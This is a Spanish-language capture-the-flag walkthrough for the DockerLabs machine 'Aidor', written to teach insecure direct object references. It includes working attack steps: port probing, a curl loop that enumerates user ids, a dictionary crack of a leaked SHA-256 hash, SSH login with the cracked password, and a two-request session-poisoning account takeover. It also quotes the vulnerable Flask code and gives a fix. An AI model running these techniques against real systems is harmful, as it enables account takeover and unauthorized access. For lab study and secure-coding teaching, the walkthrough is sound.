# 🔓 Aidor — cuando la URL manda más que tu sesión

> **DockerLabs · Web · Muy fácil**
> Una máquina que se resuelve leyendo **tres líneas de código**. El nombre es
> una pista: *Aidor* ≈ **IDOR**.
>
> Si venís de SpookyPass: aquello era un archivo. Esto vuelve a ser web, pero
> con un fallo que no se ve mirando la pantalla — hay que mirar la URL.

---

## Antes de empezar

> ⚠️ Esta máquina corre **en tu propio computador**, dentro de Docker. No hay
> nada de nadie al otro lado. Todo lo de aquí se practica solo contra tu
> laboratorio, HackTheBox o DockerLabs.

**Lo que vas a aprender:** qué es un IDOR, por qué es el fallo web más común
del mundo real, y una idea más fina que casi nadie explica — **cómo una
función perfectamente escrita puede ser explotable porque otra le envenenó
los datos de los que se fía**.

---

## Paso 0 — Levantar la máquina

```bash
unzip aidor.zip
cd aidor
sudo bash auto_deploy.sh aidor.tar
```

Te dice la IP. Suele ser `172.17.0.2`.

> 🩹 **Si se te muere sola a los dos minutos** (te pasará): el contenedor
> arranca con `service ssh start && python3 app.py`. Si Flask se cae, el `&&`
> se lleva por delante al proceso principal y la máquina entera se apaga.
> Se arregla pidiéndole a Docker que la reviva sola:
>
> ```bash
> docker rm -f aidor_container
> docker run -d --name aidor --restart unless-stopped aidor:latest
> ```

---

## Paso 1 — ¿Qué hay escuchando?

Aquí hay una lección antes de empezar, y es un error que cometí yo:

```bash
curl -I http://172.17.0.2/
```

Sin respuesta. **Y casi la doy por muerta.** No lo estaba: la aplicación no
estaba en el puerto 80. Pregunté mal.

```bash
for p in 21 22 80 443 3306 5000 8080; do
  timeout 2 bash -c "echo > /dev/tcp/172.17.0.2/$p" 2>/dev/null && echo "$p ABIERTO"
done
```

```
22 ABIERTO
5000 ABIERTO
```

El **5000** es el puerto por defecto de Flask. Y el **22** —SSH— guardalo,
que lo vamos a usar al final.

> **La lección:** «no responde» casi nunca significa «no hay nada». Significa
> «no hay nada *ahí donde miré*». Es el mismo error que con `strings` en
> SpookyPass.

---

## Paso 2 — Mirar la aplicación

```bash
curl -s http://172.17.0.2:5000/ | grep -oE 'href="[^"]*"|action="[^"]*"'
```

Hay login y registro. Nos registramos para ver qué pasa por dentro:

```bash
curl -s -c /tmp/c.txt -X POST http://172.17.0.2:5000/register \
  -d 'username=juan&password=juan123&email=juan@test.com' -i | grep -i '^location'
```

```
Location: /dashboard?id=55
```

**Parate aquí.** Esa línea es el reto entero.

El servidor, después de registrarte, te manda a tu panel… y **te pone tu
número de usuario en la URL, a la vista**. `id=55`.

Si tu identidad viaja en un sitio que vos podés editar, la pregunta se escribe
sola:

> ¿Y si pongo otro número?

---

## Paso 3 — Cambiar el número

```bash
curl -s "http://172.17.0.2:5000/dashboard?id=3" | grep -oE 'Bienvenido, [^<]+'
```

```
Bienvenido, juan.perez
```

> **Probá también el `1` y el `2`:** no devuelven nada. Esos ids no existen —
> la base empieza en el 3. Es normal y conviene verlo: te enseña que hay que
> **barrer un rango**, no deducir del primer intento. Si hubieras probado solo
> el 1, habrías concluido que no funciona.

Ahí está el **IDOR**. Y fijate en lo que acaba de pasar:

- No inicié sesión.
- No robé ninguna cookie.
- **Solo cambié un número en la barra de direcciones.**

**IDOR** = *Insecure Direct Object Reference*. Referencia directa insegura.
El servidor te deja pedir un objeto por su identificador **sin comprobar que
sea tuyo**. Suena tonto. Es de los fallos más reportados del mundo real, y
aparece en bancos, hospitales y colegios.

---

## Paso 4 — Barrer a todo el mundo

Si funciona con el 3, funciona con todos:

```bash
for i in $(seq 1 60); do
  N=$(curl -s -m 5 "http://172.17.0.2:5000/dashboard?id=$i" \
      | grep -oE 'Bienvenido, [^<]+' | head -1 | sed 's/Bienvenido, //')
  [ -n "$N" ] && printf "id=%-3s %s\n" "$i" "$N"
done
```

Salen **54 usuarios**. Casi todos son relleno, pero hay uno que no:

```
id=27  admin
id=52  pingu
id=53  pepe
id=54  aidor      <-- el nombre de la maquina
```

---

## Paso 5 — Lo que el panel regala de más

```bash
curl -s "http://172.17.0.2:5000/dashboard?id=54" | sed 's/<[^>]*>/ /g' | tr -s ' '
```

```
Nombre de Usuario   aidor
Correo Electrónico  aidor@aidor.es
Contraseña Actual (Hash):
7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
```

El panel **imprime el hash de la contraseña en el HTML**. Y por si fuera poco,
el JavaScript lo mete dentro del campo del formulario:

```javascript
passwordField.value = '7499aced...fc35';
```

> **Por qué esto es grave aunque sea "solo un hash":** un hash no es un
> secreto, es un **acertijo con respuesta fija**. Si la contraseña es común, se
> resuelve en segundos. Nunca se manda al navegador. Nunca.

---

## Paso 6 — Romper el hash

Primero, ¿qué tipo es? Se cuenta con los dedos:

```bash
echo -n "7499aced...fc35" | wc -c
```

**64 caracteres hexadecimales = 256 bits = SHA-256.**

| Longitud | Algoritmo |
|---|---|
| 32 | MD5 |
| 40 | SHA-1 |
| **64** | **SHA-256** |

Y ahora se prueba contra un diccionario. `rockyou.txt` trae 14 millones de
contraseñas reales, filtradas de una brecha de 2009:

```bash
python3 -c "
import hashlib
o='7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35'
for l in open('/usr/share/wordlists/rockyou.txt','rb'):
    p=l.rstrip(b'\r\n')
    if hashlib.sha256(p).hexdigest()==o:
        print(p.decode()); break
"
```

```
chocolate
```

**Al intento número 27.** No hizo falta fuerza bruta: la contraseña estaba
casi arriba del diccionario porque es una palabra que usa muchísima gente.

---

## Paso 7 — Entrar de verdad

Acordate del puerto 22.

```bash
sshpass -p 'chocolate' ssh aidor@172.17.0.2
```

```
aidor@578db01bc386:~$ id
uid=1000(aidor) gid=1000(aidor) groups=1000(aidor),100(users)
```

**Dentro.** Y fijate en la cadena completa: cambiar un número en una URL
terminó en una sesión de SSH.

> **Por qué funcionó el salto:** la misma contraseña servía para la web y para
> el sistema. Reutilizar contraseñas es lo que convierte un fallo pequeño en
> uno grande. Es exactamente por lo que, si te roban una cuenta, hay que
> cambiar **todas** las que compartían clave.

---

## Paso 8 — El fallo de verdad, en tres líneas

Ya dentro, se puede leer la aplicación:

```bash
cat /home/app.py
```

```python
@app.route('/dashboard')
def dashboard():
    user_id = request.args.get('id') or session.get('user_id')   # ①
    ...
    session['user_id'] = user[0]                                  # ②
```

**① La URL gana a la sesión.** `request.args.get('id')` va primero, y el
`or` solo mira la sesión si la URL no trae nada. El dato que controla el
atacante tiene **prioridad** sobre el que controla el servidor.

**② Leer te cambia la identidad.** Esta es la línea malvada. Al mirar el panel
de otro, el servidor **reescribe tu sesión** con ese id. No es que veas a
`aidor`: es que **pasás a ser** `aidor`.

Y ahora mirá la función de cambiar contraseña:

```python
@app.route('/change_password', methods=['POST'])
def change_password():
    if 'user_id' not in session:
        return redirect(url_for('index'))
    user_id = session['user_id']                                  # ③
    cursor.execute('UPDATE users SET password=? WHERE id=?', (hashed, user_id))
```

**③ Esta función está bien escrita.** Comprueba que haya sesión. No acepta
ningún id de la URL. Usa consultas parametrizadas. **Hace todo lo correcto.**

Y aun así es explotable — porque confía en una sesión que la otra función ya
había envenenado.

> 🧠 **La idea que te llevás de esta máquina:** un fallo no siempre vive dentro
> de una función. A veces vive **entre dos funciones**, cada una razonable por
> separado. Auditar función por función no lo encuentra; hay que preguntarse
> *de dónde viene este dato y quién pudo tocarlo antes*.

---

## Paso 9 — Robar la cuenta sin romper nada

Con eso claro, sobra el diccionario. Dos peticiones:

```bash
# 1. me convierto en aidor con solo mirar su panel
curl -s -c /tmp/j.txt "http://172.17.0.2:5000/dashboard?id=54" -o /dev/null

# 2. le cambio la contrasena. No mando ningun id: la cookie ya dice que soy el
curl -s -b /tmp/j.txt -X POST "http://172.17.0.2:5000/change_password" \
     -d "new_password=hackeado123"
```

Comprobado contra la base de datos:

```
antes:    7499aced43869b27f505701e4edc737f...    (chocolate)
despues:  31ab1635fafaeffe02052c26646b2604...    = sha256("hackeado123")
```

**Sin iniciar sesión, sin contraseña, sin mandar ningún id.** Solo visitar una
URL y luego un formulario.

---

## Lo que NO conseguí, y lo digo

**No logré llegar a root.** Lo buscado y descartado, para que no pierdas el
tiempo repitiéndolo:

| Vía | Resultado |
|---|---|
| `sudo -l` | `sudo` ni siquiera está instalado |
| Binarios SUID | Solo los normales de Debian |
| Capabilities | Ninguna |
| Tareas cron | Ninguna |
| Grupos de `aidor` | `aidor`, `users`. Nada privilegiado |
| `/home/app.py` escribible | No (corre como root, habría sido directo) |
| Reutilizar `chocolate`/`pingu`/`pepe` para root | Falla |

**La pista que sí queda abierta:** la app corre **como root** y con
`app.run(debug=True)`. Un Flask en modo depuración expone una consola de
Python en `/console` que ejecutaría comandos **como root**. No conseguí
entrar: hace falta el secreto que solo aparece en una página de error, y la
aplicación maneja bien todos los errores que probé.

Si lo sacás, contalo. **No pongo aquí un camino que no comprobé** — decir «se
hace así» sin haberlo hecho es exactamente el error que estas guías intentan
enseñar a no cometer.

---

## Lo que te llevás

| Comando | Para qué |
|---|---|
| `/dev/tcp/IP/PUERTO` | Escanear puertos sin instalar nada |
| `curl -i` | Ver las cabeceras, donde vive el `Location` |
| `curl -c` / `-b` | Guardar y mandar cookies |
| `seq` + bucle | Enumerar identificadores |
| `wc -c` sobre un hash | Identificar el algoritmo por su longitud |
| `rockyou.txt` | 14 millones de contraseñas reales |

Y tres ideas:

1. **Si tu identidad viaja en algo que vos podés editar, probá a editarlo.**
2. **«No responde» ≠ «no hay nada».** Casi siempre miraste en el sitio equivocado.
3. **Un fallo puede vivir entre dos funciones correctas.** Preguntate siempre de
   dónde viene el dato del que una función se fía.

---

## Preguntas que te pueden hacer

**¿Qué es exactamente un IDOR?**
Cuando una aplicación te deja pedir un objeto por su identificador sin
comprobar que sea tuyo. `?id=3` en vez de `?id=55`. No hace falta ninguna
herramienta: se explota escribiendo en la barra de direcciones.

**¿Cómo se arregla?**
Nunca decidir *de quién* es un recurso con un dato que manda el cliente. El id
sale de la sesión del servidor, y punto. En este caso: borrar
`request.args.get('id') or` y quedarse con `session.get('user_id')`.

**¿Por qué es grave enviar un hash al navegador?**
Porque un hash no es un secreto, es un acertijo de respuesta fija. Si la
contraseña es común, cae en segundos con un diccionario. Aquí cayó al intento 27.

**Si `change_password` está bien escrita, ¿dónde está el fallo?**
En `dashboard`, que reescribe `session['user_id']` con un valor que viene de la
URL. `change_password` confía en la sesión — y hace bien — pero alguien ya la
había envenenado. El fallo está en la interacción, no en la función.

**¿Cómo supiste que era SHA-256?**
Por la longitud: 64 caracteres hexadecimales son 256 bits. 32 sería MD5, 40
SHA-1. No hay que adivinar, se cuenta.

---

## Errores comunes

- **Dar la máquina por muerta si el 80 no responde.** Escaneá puertos. Me pasó.
- **Probar solo tu propio id.** Sin comparar con el de otro, no medís nada.
- **Lanzar fuerza bruta antes que el diccionario.** La contraseña estaba en la
  posición 27 de rockyou.
- **Leer solo la función sospechosa.** El fallo estaba repartido entre dos.
- **Pelearse con el contenedor que se muere.** Usá `--restart unless-stopped`.

---

## Si te atascaste

<details>
<summary>La pista del principio</summary>

Registrate y mirá **a dónde te redirige** el servidor. La cabecera `Location`
te está diciendo el fallo entero.

</details>

<details>
<summary>La contraseña de aidor</summary>

`chocolate` — sale de romper el hash SHA-256 del panel con `rockyou.txt`.

</details>

---

*Guía del arsenal de la comunidad. Practicá solo contra objetivos autorizados.*
